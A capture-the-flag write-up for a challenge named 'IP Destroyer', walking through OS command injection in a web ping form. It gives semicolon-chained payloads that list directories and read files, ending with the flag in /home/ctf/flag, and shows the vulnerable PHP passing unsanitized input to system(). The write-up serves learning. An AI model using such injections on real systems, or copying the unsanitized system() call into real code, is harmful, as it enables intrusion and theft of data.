# The second challenge it's called IP Destroyer
## Exploit : OS Command Injection

## First, we are presented with a web interface asking us to input an IP address to ping.

<img width="855" height="674" alt="image" src="https://github.com/user-attachments/assets/2ff6bdac-1dbe-4d01-b0cd-595dd6559a1e" />

## If we test the input field by providing the loopback address 127.0.0.1, which is localhost, we can see that the server execates a system ping command against that IP and returns the output to the page.

<img width="987" height="879" alt="image" src="https://github.com/user-attachments/assets/2d838a6f-f1f0-4541-9c32-81a1f32273d1" />

## Knowing that the application interacts with the operating system by using ping command, we can attempt an OS Command Injection on the target. 
### We can achieve this by using the payload `-c 1 127.0.0.1; ls`

```
-c 1: Tells the ping command to send only 1 packet to the target
-----
; ls: The semicolon acts as a command separator in Linux, allowing us to "escape" the intended ping command and execate ls 
```

### Our injected payload looks like this:
```
-c 1 127.0.0.1;ls
```
### How the server interprets it:
```
ping -c 1 127.0.0.1;ls 
```

<img width="1206" height="957" alt="image" src="https://github.com/user-attachments/assets/0b5264df-a089-4ab9-a18f-4cd7e55954bc" />

## We manage to list the current directory where it's stored the file called "mysecret.txt" .
### And like before we can escape the ping command and try to cat the file :

```
-c 1 127.0.0.1; cat mysecret.txt
```

<img width="997" height="900" alt="image" src="https://github.com/user-attachments/assets/290db3ad-52aa-4f9f-9539-46d9eed40f89" />

### The response was empty ... or not ? , to see this i use "ls -la" to see if the file it s empty , and it was not empty it has 1181 bytes

```
-rw-r--r-- 1 www-data www-data 1181 May  8 08:19 mysecret.txt
```
<img width="730" height="720" alt="image" src="https://github.com/user-attachments/assets/e49d049c-4a09-4077-bd76-0409c0e0911e" />

<img width="899" height="555" alt="image" src="https://github.com/user-attachments/assets/e6614ac0-06e3-46b8-930e-fa89769bbd26" />


### After that to see what it's inside because i was curious , i encoded the text in base64 and decoded using CyberChef 

```
-c 1 127.0.0.1; base64 mysecret.txt
```

<img width="1016" height="962" alt="image" src="https://github.com/user-attachments/assets/ba41aa0f-102d-45ea-931a-30df2879b6ae" />
<img width="1532" height="897" alt="image" src="https://github.com/user-attachments/assets/fa63a254-6de4-41d9-b56a-cc09373ab1f3" />

## And it's looks like the file mysecret.txt it's a rabbit-hole , after i lost the time with that i look more on the page and find the flag on `/home/ctf/flag`

```
-c 1 127.0.0.1; ls /home/ctf
```

## By using `cat` i manage to see the flag 

```
-c 1 127.0.0.1;cat /home/ctf/flag
```

<img width="762" height="775" alt="image" src="https://github.com/user-attachments/assets/632b720b-5a80-4061-820f-751cd58ffa66" />




# Why it's working ? 
### This exploit works because the backend code likely fails to sanitize the user input before passing it to a system shell execation function. The PHP code looks like this:
```php
<?php if (isset($_POST['destroy'])): ?>
    <p id="message">It actually just pings the target... Oops!</p>
    <pre><?php echo system('ping ' . $_POST['ip'] . ''); ?></pre>
<?php endif; ?>
```

### When we input our payload, the $_POST['ip'] parameter is replaced entirely by `-c 1 127.0.0.1; ls` . The final string sent to the system becomes:

```
ping -c 1 127.0.0.1; ls
```

### The system shell sees two distinct instructions separated by the `;` . It executes the ping command first, and then immediately executes our injected ls command, returning the directory listing directly to the web page.
